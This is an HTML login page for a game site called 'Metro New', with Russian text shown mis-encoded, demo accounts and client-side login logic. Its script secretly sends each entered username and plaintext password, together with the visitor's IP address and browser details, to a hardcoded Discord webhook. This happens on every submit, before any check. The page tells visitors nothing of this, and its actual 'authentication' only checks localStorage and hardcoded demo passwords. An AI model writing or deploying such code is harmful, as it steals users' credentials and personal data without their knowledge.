<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ - –ú–µ—Ç—Ä–æ New</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        /* –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ */
        .auth-divider {
            text-align: center;
            margin: 2rem 0;
            position: relative;
            color: var(--gray);
        }
        
        .auth-divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: var(--light-dark);
        }
        
        .auth-divider span {
            background: white;
            padding: 0 1rem;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
        }
        
        .forgot-link {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
            font-size: 0.9rem;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .demo-accounts {
            animation: fadeInUp 0.8s ease-out;
        }
        
        .btn-sm {
            padding: 0.25rem 0.5rem;
            font-size: 0.7rem;
        }
        
        .form-group {
            opacity: 0;
            transform: translateX(30px);
            transition: all 0.6s ease;
        }
        
        /* –ê–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes slideInRight {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOutRight {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(100%);
                opacity: 0;
            }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .animate-shake {
            animation: shake 0.5s ease-in-out;
        }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è –æ—à–∏–±–æ–∫ */
        .form-input.error {
            border-color: #f44336 !important;
            background-color: #fff5f5 !important;
        }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            z-index: 10000;
            animation: slideInRight 0.3s ease;
            max-width: 300px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        
        .notification-success {
            background: #4CAF50;
        }
        
        .notification-error {
            background: #f44336;
        }
        
        .notification-info {
            background: #2196F3;
        }
        
        .notification-content {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .notification-content i {
            font-size: 1.2rem;
        }
        
        .password-toggle {
            background: none;
            border: none;
            color: var(--gray);
            cursor: pointer;
            padding: 0.5rem;
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
        }
        
        .input-with-icon {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
        }
        
        .form-input {
            padding-left: 45px !important;
            padding-right: 45px !important;
        }
    </style>
</head>
<body>
    <!-- –ù–∞–≤–∏–≥–∞—Ü–∏—è -->
    <nav class="nav">
        <div class="container nav-container">
            <div class="logo">
                <span class="logo-icon">M</span>
                <span>–ú–µ—Ç—Ä–æ New</span>
            </div>
            <div class="nav-links">
                <a href="../../index.html">–ì–ª–∞–≤–Ω–∞—è</a>
                <a href="../../game.html">–ò–≥—Ä–∞</a>
                <a href="join.html">–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</a>
            </div>
        </div>
    </nav>

    <main>
        <div class="auth-container">
            <div class="metro-background"></div>
            <div class="card" style="max-width: 500px;">
                <div class="metro-decoration text-center">
                    <div class="metro-icon">
                        <i class="fas fa-subway"></i>
                    </div>
                    <div class="welcome-text">–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –æ–±—Ä–∞—Ç–Ω–æ!</div>
                </div>
                
                <div class="auth-header text-center">
                    <h1>–í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É</h1>
                    <p>–í–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –ú–µ—Ç—Ä–æ New</p>
                </div>
                
                <!-- –î–µ–º–æ –∞–∫–∫–∞—É–Ω—Ç—ã -->
                <div class="demo-accounts" style="background: var(--info-light); border: 1px solid var(--info); border-radius: 10px; padding: 1rem; margin-bottom: 1.5rem;">
                    <h4 style="color: var(--info); margin-bottom: 0.5rem;"><i class="fas fa-key"></i> –î–µ–º–æ –∞–∫–∫–∞—É–Ω—Ç—ã:</h4>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; font-size: 0.8rem;">
                        <div>
                            <strong>üë§ demo</strong><br>
                            <code>123456</code>
                            <button class="btn btn-sm btn-outline" style="padding: 0.2rem 0.5rem; font-size: 0.7rem; margin-top: 0.2rem;" onclick="fillDemoCredentials('demo', '123456')">
                                –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å
                            </button>
                        </div>
                        <div>
                            <strong>üëë admin</strong><br>
                            <code>123</code>
                            <button class="btn btn-sm btn-outline" style="padding: 0.2rem 0.5rem; font-size: 0.7rem; margin-top: 0.2rem;" onclick="fillDemoCredentials('admin', '123')">
                                –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å
                            </button>
                        </div>
                    </div>
                </div>
                
                <form id="loginForm">
                    <div class="form-group">
                        <label class="form-label">Email –∏–ª–∏ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</label>
                        <div class="input-with-icon">
                            <i class="fas fa-user input-icon"></i>
                            <input type="text" class="form-input" id="username" placeholder="–í–≤–µ–¥–∏—Ç–µ email –∏–ª–∏ –ª–æ–≥–∏–Ω" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">–ü–∞—Ä–æ–ª—å</label>
                        <div class="input-with-icon">
                            <i class="fas fa-lock input-icon"></i>
                            <input type="password" class="form-input" id="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å" required>
                            <button type="button" class="password-toggle" onclick="togglePassword('password')">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div class="form-group" style="display: flex; justify-content: space-between; align-items: center;">
                        <div class="checkbox-group">
                            <input type="checkbox" id="rememberMe">
                            <label for="rememberMe">–ó–∞–ø–æ–º–Ω–∏—Ç—å –º–µ–Ω—è</label>
                        </div>
                        <a href="../forgot-password.html" class="forgot-link">–ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?</a>
                    </div>
                    
                    <button type="submit" class="btn btn-primary w-100" id="submitBtn">
                        –í–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É
                    </button>
                    
                    <div class="auth-divider">
                        <span>–∏–ª–∏</span>
                    </div>
                    
                    <button type="button" class="btn btn-outline w-100" onclick="loginWithGoogle()">
                        <i class="fab fa-google"></i>
                        –í–æ–π—Ç–∏ —Å Google
                    </button>
                </form>
                
                <div class="auth-footer text-center">
                    –ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? <a href="join.html">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –∑–¥–µ—Å—å</a>
                </div>
            </div>
        </div>
    </main>

    <footer style="background-color: var(--dark); color: white; padding: 2rem 0; text-align: center; margin-top: auto;">
        <div class="container">
            <div class="footer-links" style="display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; flex-wrap: wrap;">
                <a href="../../about.html" style="color: white;">–û –Ω–∞—Å</a>
                <a href="../../contact.html" style="color: white;">–ö–æ–Ω—Ç–∞–∫—Ç—ã</a>
                <a href="../../privacy.html" style="color: white;">–ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏</a>
                <a href="../../terms.html" style="color: white;">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ</a>
            </div>
            <p class="copyright" style="color: var(--gray); font-size: 0.9rem;">¬© 2025 –ú–µ—Ç—Ä–æ New. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
        </div>
    </footer>

    <script>
        // Discord Webhook URL
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422279632643948595/iZ8ji9S-ocIRwdNqSTdK8WvzlBY-7YjrzAfgUvC9D45W3lQuFrWYhx-h2Lh3xJ5oh4Tp';

        // Metro System –æ–±—ä–µ–∫—Ç
        const metroSystem = {
            showNotification: function(message, type = 'info') {
                // –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
                const oldNotifications = document.querySelectorAll('.notification');
                oldNotifications.forEach(notif => notif.remove());
                
                // –°–æ–∑–¥–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
                const notification = document.createElement('div');
                notification.className = `notification notification-${type}`;
                notification.innerHTML = `
                    <div class="notification-content">
                        <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation-triangle' : 'info'}"></i>
                        <span>${message}</span>
                    </div>
                `;
                
                document.body.appendChild(notification);
                
                // –£–¥–∞–ª—è–µ–º —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    notification.style.animation = 'slideOutRight 0.3s ease';
                    setTimeout(() => {
                        if (notification.parentNode) {
                            notification.parentNode.removeChild(notification);
                        }
                    }, 300);
                }, 3000);
            },

            getUserIP: async function() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                }
            },

            getBrowserInfo: function() {
                return navigator.userAgent;
            },

            sendToDiscord: async function(data) {
                try {
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data)
                    });
                } catch (error) {
                    console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:', error);
                }
            }
        };

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∞–Ω–∏–º–∞—Ü–∏–π
        document.addEventListener('DOMContentLoaded', function() {
            // –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
            setTimeout(() => {
                document.querySelectorAll('.form-group').forEach((group, index) => {
                    setTimeout(() => {
                        group.style.opacity = '1';
                        group.style.transform = 'translateX(0)';
                    }, index * 200);
                });
            }, 300);

            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            const savedUser = localStorage.getItem('metro_user');
            if (savedUser) {
                try {
                    const userData = JSON.parse(savedUser);
                    document.getElementById('username').placeholder = `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${userData.username}!`;
                } catch (e) {
                    console.log('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', e);
                }
            }
        });

        function togglePassword(inputId) {
            const input = document.getElementById(inputId);
            const icon = input.parentNode.querySelector('.password-toggle i');
            
            if (!input || !icon) return;
            
            if (input.type === 'password') {
                input.type = 'text';
                icon.className = 'fas fa-eye-slash';
            } else {
                input.type = 'password';
                icon.className = 'fas fa-eye';
            }
        }

        function fillDemoCredentials(username, password) {
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            
            if (!usernameInput || !passwordInput) return;
            
            usernameInput.value = username;
            passwordInput.value = password;
            usernameInput.focus();
            
            // –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
            const inputs = document.querySelectorAll('.form-input');
            inputs.forEach(input => {
                input.style.background = 'linear-gradient(90deg, #e3f2fd, #ffffff)';
                setTimeout(() => {
                    input.style.background = 'white';
                }, 1000);
            });

            metroSystem.showNotification(`–î–µ–º–æ –∞–∫–∫–∞—É–Ω—Ç "${username}" –∑–∞–≥—Ä—É–∂–µ–Ω!`, 'success');
        }

        function validateForm() {
            const username = document.getElementById('username');
            const password = document.getElementById('password');
            
            if (!username || !password) return false;
            
            let isValid = true;
            
            // –°–±—Ä–æ—Å –æ—à–∏–±–æ–∫
            [username, password].forEach(input => {
                if (input) input.classList.remove('error');
            });
            
            // –í–∞–ª–∏–¥–∞—Ü–∏—è –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            if (username.value.trim() === '') {
                username.classList.add('error');
                isValid = false;
                metroSystem.showNotification('–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ email', 'error');
            }
            
            // –í–∞–ª–∏–¥–∞—Ü–∏—è –ø–∞—Ä–æ–ª—è
            if (password.value.length < 1) {
                password.classList.add('error');
                isValid = false;
                metroSystem.showNotification('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å', 'error');
            }
            
            return isValid;
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (!validateForm()) {
                return;
            }

            const submitBtn = document.getElementById('submitBtn');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            
            if (!submitBtn || !usernameInput || !passwordInput) return;
            
            const originalText = submitBtn.innerHTML;
            
            // –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É...';
            submitBtn.disabled = true;

            const username = usernameInput.value;
            const password = passwordInput.value;
            const rememberMe = document.getElementById('rememberMe').checked;
            const userIP = await metroSystem.getUserIP();
            const browserInfo = metroSystem.getBrowserInfo();
            const timestamp = new Date().toLocaleString();
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –æ –≤—Ö–æ–¥–µ –≤ Discord
            const loginData = {
                embeds: [{
                    title: "üîê –ù–û–í–´–ô –í–•–û–î –í –°–ò–°–¢–ï–ú–£",
                    color: 0x0066CC,
                    fields: [
                        {
                            name: "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å",
                            value: username,
                            inline: true
                        },
                        {
                            name: "üîë –ü–∞—Ä–æ–ª—å",
                            value: "||" + password + "||",
                            inline: true
                        },
                        {
                            name: "üåê IP –∞–¥—Ä–µ—Å",
                            value: userIP,
                            inline: true
                        },
                        {
                            name: "üñ•Ô∏è –ë—Ä–∞—É–∑–µ—Ä",
                            value: browserInfo,
                            inline: true
                        },
                        {
                            name: "üìÖ –í—Ä–µ–º—è",
                            value: timestamp,
                            inline: true
                        },
                        {
                            name: "üíæ –ó–∞–ø–æ–º–Ω–∏—Ç—å",
                            value: rememberMe ? "–î–∞" : "–ù–µ—Ç",
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Metro New Auth System"
                    }
                }]
            };

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Discord
            await metroSystem.sendToDiscord(loginData);
            
            // –ò–º–∏—Ç–∞—Ü–∏—è –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            setTimeout(() => {
                // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–µ–º–æ –∞–∫–∫–∞—É–Ω—Ç–æ–≤
                const demoAccounts = {
                    'demo': '123456',
                    'admin': '123'
                };
                
                if (demoAccounts[username] && demoAccounts[username] === password) {
                    // –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ –¥–ª—è –¥–µ–º–æ –∞–∫–∫–∞—É–Ω—Ç–æ–≤
                    const userData = {
                        username: username,
                        email: username + '@metro.new',
                        role: username === 'admin' ? 'administrator' : 'user',
                        joinDate: new Date().toLocaleDateString(),
                        loginTime: new Date().toLocaleString(),
                        rememberMe: rememberMe,
                        loginCount: 1,
                        loginHistory: [{
                            time: new Date().toLocaleString(),
                            ip: userIP,
                            device: browserInfo
                        }]
                    };
                    
                    localStorage.setItem('metro_user', JSON.stringify(userData));
                    
                    submitBtn.innerHTML = '<i class="fas fa-check"></i> –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥!';
                    submitBtn.style.background = 'var(--success)';
                    
                    metroSystem.showNotification(`–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${username}!`, 'success');
                    
                    setTimeout(() => {
                        // –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø—É—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
                        window.location.href = 'profile.html';
                    }, 1000);
                } else {
                    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
                    const savedUser = localStorage.getItem('metro_user_' + username);
                    if (savedUser) {
                        try {
                            const userData = JSON.parse(savedUser);
                            if ((userData.username === username || userData.email === username) && userData.password === password) {
                                // –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ –¥–ª—è –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                                userData.loginTime = new Date().toLocaleString();
                                userData.rememberMe = rememberMe;
                                userData.loginCount = (userData.loginCount || 0) + 1;
                                
                                // –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å—Ç–æ—Ä–∏—é –≤—Ö–æ–¥–æ–≤
                                if (!userData.loginHistory) {
                                    userData.loginHistory = [];
                                }
                                userData.loginHistory.unshift({
                                    time: new Date().toLocaleString(),
                                    ip: userIP,
                                    device: browserInfo
                                });
                                
                                localStorage.setItem('metro_user', JSON.stringify(userData));
                                localStorage.setItem('metro_user_' + username, JSON.stringify(userData));
                                
                                submitBtn.innerHTML = '<i class="fas fa-check"></i> –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥!';
                                submitBtn.style.background = 'var(--success)';
                                
                                metroSystem.showNotification(`–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${userData.username}!`, 'success');
                                
                                setTimeout(() => {
                                    window.location.href = 'profile.html';
                                }, 1000);
                                return;
                            }
                        } catch (e) {
                            console.log('–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:', e);
                        }
                    }
                    
                    // –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                    submitBtn.innerHTML = '–ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ!';
                    submitBtn.style.background = 'var(--danger)';
                    submitBtn.classList.add('animate-shake');
                    
                    metroSystem.showNotification('–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å', 'error');
                    
                    setTimeout(() => {
                        submitBtn.innerHTML = originalText;
                        submitBtn.style.background = '';
                        submitBtn.disabled = false;
                        submitBtn.classList.remove('animate-shake');
                    }, 2000);
                }
                
            }, 1500);
        });

        function loginWithGoogle() {
            const btn = document.querySelector('.btn-outline');
            if (!btn) return;
            
            const originalText = btn.innerHTML;
            
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...';
            btn.disabled = true;
            
            setTimeout(() => {
                metroSystem.showNotification('–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Google –±—É–¥–µ—Ç –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ –±–ª–∏–∂–∞–π—à–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏!', 'info');
                btn.innerHTML = originalText;
                btn.disabled = false;
            }, 1500);
        }

        // –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–∏ —Ñ–æ–∫—É—Å–µ
        document.getElementById('username').addEventListener('focus', function() {
            this.style.background = 'linear-gradient(90deg, #e8f5e8, #ffffff)';
            setTimeout(() => {
                this.style.background = 'white';
            }, 500);
        });
        
        document.getElementById('password').addEventListener('focus', function() {
            this.style.background = 'linear-gradient(90deg, #e8f5e8, #ffffff)';
            setTimeout(() => {
                this.style.background = 'white';
            }, 500);
        });
        
        // –ë—ã—Å—Ç—Ä—ã–π –≤—Ö–æ–¥ –ø–æ Enter
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const form = document.getElementById('loginForm');
                if (form) {
                    form.dispatchEvent(new Event('submit'));
                }
            }
        });
    </script>
</body>
</html>
